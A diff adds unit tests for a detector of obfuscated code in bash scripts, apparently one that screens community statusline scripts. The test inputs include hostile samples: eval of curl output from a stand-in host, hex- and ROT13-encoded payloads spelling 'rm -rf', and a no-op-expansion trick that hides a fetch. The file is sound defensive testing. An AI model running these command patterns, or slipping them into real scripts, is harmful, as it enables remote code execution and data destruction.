@@ -75,6 +75,69 @@ describe('detectObfuscation', () => {
     expect(reasons.some((r) => r.toLowerCase().includes('eval'))).toBe(true)
   })
 
+  it('flags eval of network-fetched content (curl)', () => {
+    const source = `#!/bin/bash\neval "$(curl -s https://evil.example/payload.sh)"`
+    const reasons = detectObfuscation(source)
+    expect(reasons.some((r) => r.toLowerCase().includes('eval'))).toBe(true)
+  })
+
+  it('flags eval of hex-decoded content (xxd)', () => {
+    const source = `#!/bin/bash\neval "$(xxd -r -p <<< "$hexblob")"`
+    const reasons = detectObfuscation(source)
+    expect(reasons.some((r) => r.toLowerCase().includes('eval'))).toBe(true)
+  })
+
+  // The safe, ubiquitous "parse JSON into shell vars" idiom — jq @sh shell-escapes its output, and
+  // the eval'd text is plainly visible to a reviewer. This MUST NOT be flagged (it blocked four real
+  // community statuslines before this carve-out).
+  it('does NOT flag eval of jq @sh output (visible, shell-escaped)', () => {
+    const source = `#!/bin/bash\neval "$(jq -r '@sh "model=\\(.model) cost=\\(.cost)"')"`
+    expect(detectObfuscation(source)).toEqual([])
+  })
+
+  it('does NOT flag eval of a piped echo|jq @sh extract', () => {
+    const source = `#!/bin/bash\ninput=$(cat)\neval "$(echo "$input" | jq -r '@sh "n=\\(.n)"')"`
+    expect(detectObfuscation(source)).toEqual([])
+  })
+
+  it('does NOT flag eval of other plainly-visible command substitution (ssh-agent, direnv)', () => {
+    expect(detectObfuscation(`#!/bin/bash\neval "$(ssh-agent -s)"`)).toEqual([])
+    expect(detectObfuscation(`#!/bin/bash\neval "$(direnv hook bash)"`)).toEqual([])
+  })
+
+  // Default-flag: any eval of dynamically-generated content that isn't a whitelisted safe idiom is
+  // flagged, even when the hiding doesn't use base64/curl. (Regression cases from security review.)
+  it('flags eval of printf hex-escape content', () => {
+    const source = `#!/bin/bash\neval "$(printf '\\x72\\x6d\\x20\\x2d\\x72\\x66')"`
+    expect(detectObfuscation(source).length).toBeGreaterThan(0)
+  })
+
+  it('flags eval of ROT13 / rev / interpreter-decoded content', () => {
+    expect(
+      detectObfuscation(`#!/bin/bash\neval "$(echo "$p" | tr 'A-Za-z' 'N-ZA-Mn-za-m')"`).length,
+    ).toBeGreaterThan(0)
+    expect(detectObfuscation(`#!/bin/bash\neval "$(echo "$p" | rev)"`).length).toBeGreaterThan(0)
+    expect(
+      detectObfuscation(
+        `#!/bin/bash\neval "$(python3 -c 'import base64;print(base64.b64decode(x))')"`,
+      ).length,
+    ).toBeGreaterThan(0)
+  })
+
+  it('flags eval of base64 with the uppercase BSD -D decode flag', () => {
+    expect(detectObfuscation(`#!/bin/bash\neval "$(base64 -D <<< "$b")"`).length).toBeGreaterThan(0)
+  })
+
+  it('flags eval that hides a fetch behind a dollar-brace no-op expansion (comment-trick bypass)', () => {
+    expect(
+      detectObfuscation(`#!/bin/bash\neval "\${_#}$(curl -s https://evil.example/x)"`).length,
+    ).toBeGreaterThan(0)
+  })
+
+  it('flags eval of a backticked printf payload', () => {
+    expect(detectObfuscation("#!/bin/bash\neval `printf '\\x72\\x6d'`").length).toBeGreaterThan(0)
+  })
+
   it('flags a single line longer than 500 chars', () => {
     const longLine = 'x'.repeat(501)
     const source = `#!/bin/bash\n${longLine}\necho done`
